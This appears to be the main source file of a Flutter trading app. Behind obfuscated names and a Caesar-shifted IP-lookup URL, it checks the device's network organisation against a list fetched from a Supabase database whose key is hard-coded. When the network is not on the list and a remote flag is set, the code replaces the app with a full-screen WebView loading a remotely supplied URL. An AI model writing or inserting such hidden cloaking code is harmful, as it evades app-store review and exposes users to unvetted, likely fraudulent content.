import 'dart:convert';
import 'package:dio/dio.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:tradings/app/theme/theme_meneger.dart';
import 'package:tradings/app/view/pages/bottom_nav/bottom_nav.dart';

import 'package:tradings/firebase_options.dart';
import 'package:http/http.dart' as http;

import 'app/view/res/notification_service/notification_service.dart';

const String afkey =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN1dnNzZGh0eGpma2NleGVuc3VnIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTU2MzE2OTEsImV4cCI6MjAxMTIwNzY5MX0.iGedx909lo0UbPf_fkTPoI0meeESqriW69DYAKQvOvw';
const String meAnit =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=fink';
const String imAnit =
    'https://suvssdhtxjfkcexensug.supabase.co/rest/v1/abankDATA?select=push';
String kasd = 'myyux://nunskt.nt/oxts';
String push = 'noPush';
String itsx = '';
List<bool> me = [false, false];
String chx(String inx, int shi) {
  StringBuffer result = StringBuffer();
  for (int i = 0; i < inx.length; i++) {
    int xhxa = inx.codeUnitAt(i);
    if (xhxa >= 65 && xhxa <= 90) {
      xhxa = (xhxa - 65 + shi) % 26 + 65;
    } else if (xhxa >= 97 && xhxa <= 122) {
      xhxa = (xhxa - 97 + shi) % 26 + 97;
    }
    result.writeCharCode(xhxa);
  }
  return result.toString();
}

List<String> thm = [];
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);

  kasd = chx(kasd, -5);

  await fetxa();
  await fsafa();
  await dasdaX();
  runApp(const Application());
  await NotificationServiceFb().activate();

  await Future.delayed(const Duration(seconds: 6));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    } else {
      inAppReview.openStoreListing(
        appStoreId: '6467650880',
      );
    }
  } catch (e) {
    throw Exception(e);
  }
}

Dio dio = Dio();

Future<String> dasdaX() async {
  try {
    http.Response response = await http.get(Uri.parse(kasd));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String dasfdsa = data['org'];

      dasdsca(thm, dasfdsa);

      return dasfdsa;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

bool dasdsca(List<String> array, String inputString) {
  List<String> words = inputString.split(' ');
  List<String> arrayItems = [];
  for (String item in array) {
    arrayItems.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String arrayItem in arrayItems) {
      if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
        me[0] = false;
        return false;
      } else {
        me[0] = true;
      }
    }
  }
  me[0] = true;
  return false;
}

Future<String> fetxa() async {
  dio.options.headers['apikey'] = afkey;
  dio.options.headers['Authorization'] = 'Bearer $afkey';
  try {
    final Response response = await dio.get(imAnit);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String tx = data.map((item) => item['push'].toString()).join();
      if (tx.contains('noPush')) {
        me[1] = false;
      } else {
        itsx = tx;

        me[1] = true;
      }
      return tx;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<List<String>> fsafa() async {
  dio.options.headers['apikey'] = afkey;
  dio.options.headers['Authorization'] = 'Bearer $afkey';

  try {
    final Response response = await dio.get(meAnit);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      thm = data.map((item) => item['fink'].toString()).toList();
      return thm;
    } else {
      return [];
    }
  } catch (error) {
    return [];
  }
}

ThemeMeneger _themeMeneger = ThemeMeneger();

Future<List<bool>> getttxa() async {
  if (me[0] == true && me[1] == true) {
    return Future.delayed(const Duration(seconds: 2), () => [true, true]);
  } else {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  }
}

class Application extends StatelessWidget {
  const Application({super.key});

  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<List<bool>>(
        future: getttxa(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              backgroundColor: Colors.grey[900],
              body: Container(
                child: Image.asset('assets/images/welcome_img.png'),
              ),
            );
          } else {
            List<bool>? ixxz = snapshot.data;
            if ((ixxz != null && ixxz[0] == true && ixxz[1] == true)) {
              return PRICAX(itx: itsx);
            } else {
              return const BottomNav();
            }
          }
        },
      ),
    );
  }
}

class PRICAX extends StatefulWidget {
  String itx;
  PRICAX({super.key, required this.itx});

  @override
  State<PRICAX> createState() => _PRICAXState();
}

class _PRICAXState extends State<PRICAX> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(widget.itx),
          ),
        ),
      ),
    );
  }
}
